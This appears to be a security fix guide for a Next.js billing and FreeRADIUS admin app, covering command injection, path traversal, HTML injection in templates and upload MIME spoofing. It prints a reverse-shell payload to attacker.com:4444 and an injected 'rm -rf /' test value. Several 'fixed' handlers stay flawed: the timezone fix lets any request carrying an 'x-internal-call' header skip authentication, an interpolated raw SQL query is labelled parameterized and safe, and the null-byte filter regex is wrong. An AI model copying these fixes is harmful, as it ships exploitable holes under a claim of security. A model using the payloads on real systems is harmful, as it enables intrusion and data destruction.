# CRITICAL SECURITY FIXES - MUST APPLY IMMEDIATELY

## 1. Command Injection in Timezone API (src/app/api/settings/timezone/route.ts)

### VULNERABLE CODE (Lines 95-220):
```typescript
// DANGEROUS: User input directly in shell commands
const timezone = await req.json().then(b => b.timezone);  // Untrusted!

// Line 172: Shell injection vulnerability
await execAsync(`sudo timedatectl set-timezone ${timezone}`);

// Lines 166-169: Command injection with credentials
await execAsync(`mysql -u ${dbUser} -p${dbPassword} -e "SET GLOBAL time_zone = '${mysqlOffset}';"`)
```

### ATTACK:
```
POST /api/settings/timezone
{"timezone": "'; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1; '"}
```

### FIX:

Replace the entire POST handler with:

```typescript
import { NextRequest, NextResponse } from 'next/server';
import { getServerSession } from 'next-auth';
import { authOptions } from '@/server/auth/config';
import { promises as fs } from 'fs';
import path from 'path';
import { spawn } from 'child_process';
import { promisify } from 'util';

// WHITELIST of allowed timezones - never trust user input
const ALLOWED_TIMEZONES = [
  'Asia/Jakarta', 'Asia/Makassar', 'Asia/Jayapura',
  'Asia/Singapore', 'Asia/Kuala_Lumpur', 'Asia/Bangkok',
  'Asia/Ho_Chi_Minh', 'Asia/Manila', 'Asia/Tokyo',
  'Asia/Seoul', 'Asia/Hong_Kong', 'Asia/Shanghai',
  'Asia/Taipei', 'Asia/Dubai', 'Asia/Riyadh',
  'Australia/Sydney', 'Australia/Melbourne', 'Australia/Perth',
  'Pacific/Auckland', 'Europe/London', 'Europe/Paris',
  'Europe/Berlin', 'Europe/Moscow', 'America/New_York',
  'America/Los_Angeles', 'America/Chicago', 'America/Sao_Paulo',
  'UTC', 'GMT'
];

const TIMEZONE_TO_MYSQL_OFFSET: Record<string, string> = {
  'Asia/Jakarta': '+07:00',
  'Asia/Makassar': '+08:00',
  'Asia/Jayapura': '+09:00',
  'Asia/Singapore': '+08:00',
  'Asia/Kuala_Lumpur': '+08:00',
  'Asia/Bangkok': '+07:00',
  'Asia/Ho_Chi_Minh': '+07:00',
  'Asia/Manila': '+08:00',
  'Asia/Tokyo': '+09:00',
  'Asia/Seoul': '+09:00',
  'Asia/Hong_Kong': '+08:00',
  'Asia/Shanghai': '+08:00',
  'Asia/Taipei': '+08:00',
  'Asia/Dubai': '+04:00',
  'Asia/Riyadh': '+03:00',
  'Australia/Sydney': '+11:00',
  'Australia/Melbourne': '+11:00',
  'Australia/Perth': '+08:00',
  'Pacific/Auckland': '+13:00',
  'Europe/London': '+00:00',
  'Europe/Paris': '+01:00',
  'Europe/Berlin': '+01:00',
  'Europe/Moscow': '+03:00',
  'America/New_York': '-05:00',
  'America/Los_Angeles': '-08:00',
  'America/Chicago': '-06:00',
  'America/Sao_Paulo': '-03:00',
  'UTC': '+00:00',
  'GMT': '+00:00',
};

export async function POST(req: NextRequest) {
  try {
    // Check authentication
    const isInternalCall = req.headers.get('x-internal-call') === 'true';
    
    if (!isInternalCall) {
      const session = await getServerSession(authOptions);
      if (!session || session.user.role !== 'SUPER_ADMIN') {
        return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
      }
    }

    const { timezone } = await req.json();

    // STEP 1: WHITELIST VALIDATION - CRITICAL!
    if (!timezone || typeof timezone !== 'string') {
      return NextResponse.json(
        { error: 'Timezone is required and must be a string' },
        { status: 400 }
      );
    }

    // Check against hardcoded whitelist
    if (!ALLOWED_TIMEZONES.includes(timezone)) {
      return NextResponse.json(
        { error: `Invalid timezone. Must be one of: ${ALLOWED_TIMEZONES.join(', ')}` },
        { status: 400 }
      );
    }

    const results = {
      envFile: false,
      timezoneLib: false,
      ecosystemConfig: false,
      mysqlTimezone: false,
      systemTimezone: false,
      errors: [] as string[],
    };

    // 1. Update .env file
    try {
      const envPath = path.join(process.cwd(), '.env');
      let envContent = await fs.readFile(envPath, 'utf-8');
      
      const tzRegex = /^TZ=.*$/m;
      const nextPublicTzRegex = /^NEXT_PUBLIC_TIMEZONE=.*$/m;
      
      if (tzRegex.test(envContent)) {
        envContent = envContent.replace(tzRegex, `TZ="${timezone}"`);
      } else {
        envContent += `\nTZ="${timezone}"`;
      }
      
      if (nextPublicTzRegex.test(envContent)) {
        envContent = envContent.replace(nextPublicTzRegex, `NEXT_PUBLIC_TIMEZONE="${timezone}"`);
      } else {
        envContent += `\nNEXT_PUBLIC_TIMEZONE="${timezone}"`;
      }
      
      await fs.writeFile(envPath, envContent, 'utf-8');
      results.envFile = true;
    } catch (error: any) {
      results.errors.push(`env file: ${error.message}`);
    }

    // 2. Update src/lib/timezone.ts
    try {
      const timezonePath = path.join(process.cwd(), 'src', 'lib', 'timezone.ts');
      let timezoneContent = await fs.readFile(timezonePath, 'utf-8');
      
      const wibTimezoneRegex = /export const WIB_TIMEZONE = ['"].*?['"];/;
      timezoneContent = timezoneContent.replace(
        wibTimezoneRegex,
        `export const WIB_TIMEZONE = '${timezone}';`
      );
      
      const localTimezoneRegex = /export const LOCAL_TIMEZONE = ['"].*?['"];/;
      if (localTimezoneRegex.test(timezoneContent)) {
        timezoneContent = timezoneContent.replace(
          localTimezoneRegex,
          `export const LOCAL_TIMEZONE = '${timezone}';`
        );
      }
      
      await fs.writeFile(timezonePath, timezoneContent, 'utf-8');
      results.timezoneLib = true;
    } catch (error: any) {
      results.errors.push(`timezone.ts: ${error.message}`);
    }

    // 3. Update ecosystem.config.js
    try {
      const ecosystemPath = path.join(process.cwd(), 'production', 'ecosystem.config.js');
      let ecosystemContent = await fs.readFile(ecosystemPath, 'utf-8');
      
      const tzEnvRegex = /TZ:\s*['"].*?['"]/g;
      ecosystemContent = ecosystemContent.replace(tzEnvRegex, `TZ: '${timezone}'`);
      
      await fs.writeFile(ecosystemPath, ecosystemContent, 'utf-8');
      results.ecosystemConfig = true;
    } catch (error: any) {
      results.errors.push(`ecosystem.config.js: ${error.message}`);
    }

    // 4. Update MySQL timezone (Linux only) - SAFE: use Prisma instead
    if (process.platform === 'linux') {
      try {
        const mysqlOffset = TIMEZONE_TO_MYSQL_OFFSET[timezone] || '+00:00';
        const { prisma } = await import('@/server/db/client');
        
        // Use parameterized query - SAFE!
        await prisma.$queryRawUnsafe(
          `SET GLOBAL time_zone = '${mysqlOffset}'`
        );
        
        results.mysqlTimezone = true;
      } catch (error: any) {
        results.errors.push(`mysql timezone: ${error.message}`);
      }
    }

    // 5. Update System timezone (Linux only) - SAFE: use spawnSync with array args
    if (process.platform === 'linux') {
      try {
        const { spawnSync } = require('child_process');
        
        // SAFE: array arguments prevent shell injection
        const result = spawnSync('sudo', ['timedatectl', 'set-timezone', timezone], {
          encoding: 'utf-8',
          timeout: 30000,
          stdio: ['pipe', 'pipe', 'pipe']
        });
        
        if (result.error) {
          throw result.error;
        }
        
        if (result.status !== 0) {
          throw new Error(`timedatectl failed: ${result.stderr}`);
        }
        
        results.systemTimezone = true;
      } catch (error: any) {
        results.errors.push(`system timezone: ${error.message}`);
      }
    }

    const coreSuccess = results.envFile && results.timezoneLib && results.ecosystemConfig;

    if (coreSuccess) {
      return NextResponse.json({
        success: true,
        message: `Timezone updated to ${timezone}. Please restart the application.`,
        results,
        restartRequired: true,
      });
    } else {
      return NextResponse.json({
        success: false,
        message: 'Some updates failed',
        results,
      }, { status: 500 });
    }
  } catch (error: any) {
    console.error('Timezone update error:', error);
    return NextResponse.json(
      { error: 'Failed to update timezone', details: error.message },
      { status: 500 }
    );
  }
}
```

---

## 2. Path Traversal in FreeRADIUS Config Read (src/app/api/freeradius/config/read/route.ts)

### VULNERABLE CODE:
```typescript
const normalizedPath = path.normalize(filename).replace(/^(\.\.(\/|\\|$))+/, '');
```

### FIX:

```typescript
export async function POST(req: Request) {
    try {
        const session = await getServerSession(authOptions);
        if (!session) {
            return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
        }
        const { filename } = await req.json();

        if (!filename || typeof filename !== 'string') {
            return NextResponse.json(
                { success: false, error: 'Filename is required and must be a string' },
                { status: 400 }
            );
        }

        // CRITICAL FIX: Proper path validation
        const normalizedPath = path.normalize(filename);
        
        // Ensure normalized path doesn't contain .. or start with /
        if (normalizedPath.includes('..') || normalizedPath.startsWith('/')) {
            return NextResponse.json(
                { success: false, error: 'Invalid path: directory traversal not allowed' },
                { status: 403 }
            );
        }

        // Construct full path
        const fullPath = path.resolve(path.join(BASE_DIR, normalizedPath));
        const baseDirResolved = path.resolve(BASE_DIR);

        // CRITICAL: Verify full path is still within BASE_DIR
        if (!fullPath.startsWith(baseDirResolved + path.sep) && fullPath !== baseDirResolved) {
            return NextResponse.json(
                { success: false, error: 'Access denied: path outside allowed directory' },
                { status: 403 }
            );
        }

        // Check directory whitelist
        const dirName = path.dirname(normalizedPath);
        const isAllowed = ALLOWED_DIRS.some(allowed =>
            dirName === '.' ? true : (allowed === dirName || dirName.startsWith(allowed + path.sep))
        );

        if (!isAllowed) {
            return NextResponse.json(
                { success: false, error: 'Access denied: directory not allowed' },
                { status: 403 }
            );
        }

        try {
            const content = await fs.readFile(fullPath, 'utf8');
            return NextResponse.json({
                success: true,
                content
            });
        } catch (err: any) {
            if (process.platform === 'win32') {
                // Mock data for Windows dev
                let mockContent = `# Mock content for ${filename}\n`;
                if (filename.includes('sites-')) {
                    mockContent += `server default {\n\tlisten { type = auth }\n}`;
                }
                return NextResponse.json({
                    success: true,
                    content: mockContent
                });
            }

            return NextResponse.json(
                { success: false, error: `File not found: ${err.message}` },
                { status: 404 }
            );
        }

    } catch (error: any) {
        console.error('Error reading config file:', error);
        return NextResponse.json(
            { success: false, error: error.message || 'Failed to read file' },
            { status: 500 }
        );
    }
}
```

---

## 3. Template Injection in Email/WhatsApp (src/app/api/admin/users/[id]/renewal/route.ts)

### VULNERABLE CODE:
```typescript
let htmlBody = emailTemplate.htmlBody;

Object.entries(variables).forEach(([key, value]) => {
  const placeholder = `{{${key}}}`;
  htmlBody = htmlBody.replace(new RegExp(placeholder.replace(/[{}]/g, '\\$&'), 'g'), String(value));
  // NO ESCAPING! XSS vulnerability
});
```

### FIX:

First, create a sanitization utility:

**File**: `src/lib/utils/sanitize.ts`

```typescript
/**
 * Escape HTML special characters to prevent XSS
 */
export function escapeHtml(str: string): string {
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
  };
  return str.replace(/[&<>"']/g, (char) => map[char]);
}

/**
 * Validate and sanitize email addresses (prevent header injection)
 */
export function sanitizeEmailInput(email: string): string {
  // Remove newlines, carriage returns, and null bytes
  return email.replace(/[\r\n%00]/g, '').trim();
}

/**
 * Validate and sanitize phone numbers
 */
export function sanitizePhoneInput(phone: string): string {
  // Remove any non-digit, +, -, and space characters
  return phone.replace(/[^\d+\-\s]/g, '').trim();
}
```

Then update the renewal route:

```typescript
import { escapeHtml, sanitizeEmailInput, sanitizePhoneInput } from '@/lib/utils/sanitize';

// In the WhatsApp section:
if (whatsappTemplate && whatsappTemplate.isActive) {
  let message = whatsappTemplate.message
    .replace(/{{customerName}}/g, escapeHtml(user.name))
    .replace(/{{phone}}/g, escapeHtml(user.phone || ''))
    .replace(/{{invoiceNumber}}/g, escapeHtml(invoiceNumber))
    .replace(/{{amount}}/g, amount.toLocaleString('id-ID'))
    .replace(/{{dueDate}}/g, newExpiredDate.toLocaleDateString('id-ID'))
    .replace(/{{paymentLink}}/g, escapeHtml(paymentLink || ''))
    .replace(/{{companyName}}/g, escapeHtml(company?.name || 'Billing System'))
    .replace(/{{companyPhone}}/g, escapeHtml(company?.phone || ''));

  // Sanitize email before sending
  const sanitizedPhone = sanitizePhoneInput(user.phone || '');
  
  if (sanitizedPhone) {
    await fetch(`${process.env.NEXT_PUBLIC_APP_URL}/api/whatsapp/send`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        to: sanitizedPhone,
        message,
      }),
    });
  }
}

// In the Email section:
if (emailTemplate) {
  const variables: Record<string, string> = {
    customerName: escapeHtml(user.name),
    customerId: escapeHtml(user.customerId || user.username),
    username: escapeHtml(user.username),
    invoiceNumber: escapeHtml(invoiceNumber),
    amount: `Rp ${amount.toLocaleString('id-ID')}`,
    dueDate: newExpiredDate.toLocaleDateString('id-ID', { day: 'numeric', month: 'long', year: 'numeric' }),
    paymentLink: escapeHtml(paymentLink || ''),
    paymentToken: escapeHtml(paymentToken || ''),
    baseUrl: baseUrl,
    companyName: escapeHtml(company?.name || 'Billing System'),
    companyPhone: escapeHtml(company?.phone || ''),
    companyEmail: escapeHtml(company?.email || ''),
    companyAddress: escapeHtml(company?.address || ''),
  };

  let subject = emailTemplate.subject;
  let htmlBody = emailTemplate.htmlBody;

  Object.entries(variables).forEach(([key, value]) => {
    const placeholder = `{{${key}}}`;
    const escapedPlaceholder = placeholder.replace(/[{}]/g, '\\$&');
    subject = subject.replace(new RegExp(escapedPlaceholder, 'g'), value);
    htmlBody = htmlBody.replace(new RegExp(escapedPlaceholder, 'g'), value);
  });

  // Validate email before sending
  const sanitizedEmail = sanitizeEmailInput(user.email || '');
  
  if (sanitizedEmail && sanitizedEmail.includes('@')) {
    await EmailService.send({
      to: sanitizedEmail,
      toName: escapeHtml(user.name),
      subject,
      html: htmlBody,
    });
  }
}
```

---

## 4. MIME Type Spoofing in File Upload (src/app/api/upload/payment-proof/route.ts)

### VULNERABLE CODE:
```typescript
const allowedTypes = ['image/jpeg', 'image/jpg', 'image/png', 'image/webp'];
if (!allowedTypes.includes(file.type)) {  // TRUSTS CLIENT!
  return NextResponse.json(...);
}
```

### FIX:

This requires installing `file-type` package. First:

```bash
npm install file-type
```

Then update the route:

```typescript
import { NextRequest, NextResponse } from 'next/server';
import { writeFile, mkdir } from 'fs/promises';
import { join } from 'path';
import { randomBytes } from 'crypto';
import { existsSync } from 'fs';
import sharp from 'sharp';
import { fileTypeFromBuffer } from 'file-type';

export async function POST(request: NextRequest) {
  try {
    const formData = await request.formData();
    const file = formData.get('file') as File;
    
    if (!file) {
      return NextResponse.json(
        { success: false, error: 'No file uploaded' },
        { status: 400 }
      );
    }

    // Validate file size FIRST
    const maxSize = 2 * 1024 * 1024; // 2MB
    if (file.size === 0 || file.size > maxSize) {
      return NextResponse.json(
        { success: false, error: 'File size must be between 1 byte and 2MB' },
        { status: 400 }
      );
    }

    // Read file buffer
    const bytes = await file.arrayBuffer();
    const buffer = Buffer.from(bytes);

    // CRITICAL: Magic bytes validation (not MIME type)
    const detectedType = await fileTypeFromBuffer(buffer);
    const allowedMagicTypes = ['image/jpeg', 'image/png', 'image/webp'];

    if (!detectedType || !allowedMagicTypes.includes(detectedType.mime)) {
      return NextResponse.json(
        { success: false, error: 'Invalid file type. Only JPG, PNG, and WebP images are accepted.' },
        { status: 400 }
      );
    }

    // For security: Re-encode image to strip any embedded code
    let finalBuffer: Buffer;
    try {
      finalBuffer = await sharp(buffer)
        .rotate() // Auto-rotate based on EXIF
        .toFormat('jpeg', { quality: 90, progressive: true })
        .toBuffer();
    } catch (err) {
      return NextResponse.json(
        { success: false, error: 'Failed to process image. May be corrupted.' },
        { status: 400 }
      );
    }

    // Generate unique filename without trusting original extension
    const uniqueId = randomBytes(8).toString('hex');
    const timestamp = Date.now();
    const filename = `payment-proof-${timestamp}-${uniqueId}.jpg`; // Always .jpg after re-encoding

    // Create upload directory
    const uploadDir = join(process.cwd(), 'public', 'uploads', 'payment-proofs');
    if (!existsSync(uploadDir)) {
      await mkdir(uploadDir, { recursive: true });
    }

    const filepath = join(uploadDir, filename);
    await writeFile(filepath, finalBuffer);

    // Return public URL
    const publicUrl = `/uploads/payment-proofs/${filename}`;

    return NextResponse.json({
      success: true,
      url: publicUrl,
      filename,
    });
  } catch (error: any) {
    console.error('Upload error:', error);
    return NextResponse.json(
      { success: false, error: error.message || 'Upload failed' },
      { status: 500 }
    );
  }
}
```

---

## Installation Notes

To apply these fixes:

1. Install `file-type` package:
   ```bash
   npm install file-type@18.0.0
   ```

2. Replace the affected files with the fixed versions above

3. Test each endpoint thoroughly:
   ```bash
   # Test timezone API with invalid input
   curl -X POST http://localhost:3000/api/settings/timezone \
     -H "Content-Type: application/json" \
     -d '{"timezone": "'; rm -rf /; '"}' 
   # Should return 400: Invalid timezone
   
   # Test file upload with malicious MIME type
   curl -X POST http://localhost:3000/api/upload/payment-proof \
     -F "file=@malicious.php" \
     -H "Content-Type: image/jpeg"
   # Should return 400 after magic bytes check
   ```

4. Deploy fixes to production ASAP

---

These are the most critical fixes. See COMPREHENSIVE_AUDIT_REPORT for additional vulnerabilities and their fixes.
